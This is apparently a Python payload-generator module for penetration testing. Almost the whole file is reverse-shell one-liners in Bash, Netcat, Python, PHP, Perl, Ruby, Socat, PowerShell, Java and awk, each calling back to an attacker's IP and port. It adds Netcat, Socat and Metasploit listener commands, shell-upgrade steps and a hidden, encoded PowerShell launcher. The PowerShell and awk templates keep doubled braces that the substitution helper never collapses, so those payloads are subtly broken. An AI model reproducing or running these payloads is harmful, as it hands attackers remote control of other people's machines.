"""Reverse / bind shell and listener payload generator for authorised testing.

Pure string templates — nothing is executed here. Placeholders {ip} and {port}
are substituted; helpers provide URL-encoded and PowerShell-base64 variants.
"""
from __future__ import annotations

import base64
import urllib.parse

# name -> template with {ip} {port}
REVERSE_SHELLS = {
    "Bash /dev/tcp": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "Bash (read line)": "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
    "Bash UDP": "bash -i >& /dev/udp/{ip}/{port} 0>&1",
    "Netcat -e": "nc {ip} {port} -e /bin/bash",
    "Netcat mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
    "Python3": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];import pty;pty.spawn(\"/bin/bash\")'",
    "PHP": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "Perl": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    "Ruby": "ruby -rsocket -e 'c=TCPSocket.new(\"{ip}\",{port});while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
    "Socat": "socat TCP:{ip}:{port} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
    "PowerShell": "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sx=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sx,0,$sx.Length);$s.Flush()}}\"",
    "Java": "Runtime r=Runtime.getRuntime();Process p=r.exec(new String[]{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done\"});p.waitFor();",
    "awk": "awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null",
}

# name -> listener template with {port}
LISTENERS = {
    "Netcat": "nc -lvnp {port}",
    "Netcat (rlwrap)": "rlwrap nc -lvnp {port}",
    "Socat (TTY)": "socat file:`tty`,raw,echo=0 TCP-LISTEN:{port}",
    "Metasploit handler": "msfconsole -q -x \"use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {ip}; set LPORT {port}; run\"",
    "Python http.server": "python3 -m http.server {port}",
}

SHELL_UPGRADES = [
    "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
    "export TERM=xterm",
    "Ctrl+Z, then:  stty raw -echo; fg  (press Enter twice)",
]


def _fill(template: str, ip: str, port: str) -> str:
    return template.replace("{ip}", ip or "LHOST").replace("{port}", str(port or "LPORT"))


def reverse_shell(name: str, ip: str, port: str) -> str:
    return _fill(REVERSE_SHELLS[name], ip, port)


def listener(name: str, ip: str, port: str) -> str:
    return _fill(LISTENERS[name], ip, port)


def url_encode(payload: str) -> str:
    return urllib.parse.quote(payload, safe="")


def base64_encode(payload: str) -> str:
    return base64.b64encode(payload.encode()).decode()


def powershell_encoded(payload: str) -> str:
    """PowerShell -EncodedCommand expects UTF-16LE then base64."""
    encoded = base64.b64encode(payload.encode("utf-16-le")).decode()
    return f"powershell -nop -w hidden -enc {encoded}"
